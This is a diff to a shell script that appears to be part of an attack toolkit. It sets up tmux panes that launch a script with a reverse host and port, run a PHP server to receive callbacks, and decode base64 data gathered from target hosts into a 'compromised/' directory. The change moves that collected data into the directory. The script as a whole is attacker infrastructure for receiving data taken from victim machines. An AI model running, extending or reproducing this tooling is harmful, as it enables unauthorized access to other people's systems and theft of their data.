@@ -24,20 +24,20 @@ tmux send-keys -t "${pane11}" "./screen.sh ${HOST} ${REVERSE_HOST} ${REVERSE_POR
 
 tmux split-window -t "${pane11}" -v
 tmux select-pane -t "${pane12}"
-tmux send-keys -t "${pane12}" "rm ${IP_HOST}.b64; php -S 0.0.0.0:${REVERSE_PORT}" ENTER
+tmux send-keys -t "${pane12}" "rm compromised/${IP_HOST}.b64; php -S 0.0.0.0:${REVERSE_PORT}" ENTER
 
 tmux new-window
-tmux send-keys -t "${pane21}" "watch -n 1 'cat ${IP_HOST}.b64 | base64 -d'" ENTER
+tmux send-keys -t "${pane21}" "watch -n 1 'cat compromised/${IP_HOST}.b64 | base64 -d'" ENTER
 
 tmux select-window -t "${window2}"
 tmux select-pane -t "${pane21}"
 sleep 7
 
 # can attach to see what is going on .. DEBUGGING
-# tmux attach -t gather-data
+#tmux attach -t gather-data
 # once you detach it will kill-session (see below)
 
 #kill tmux session
 tmux kill-session -t ${session_name}
 
-cat ${IP_HOST}.b64 | base64 -d
+#cat compromised/${IP_HOST}.b64 | base64 -d
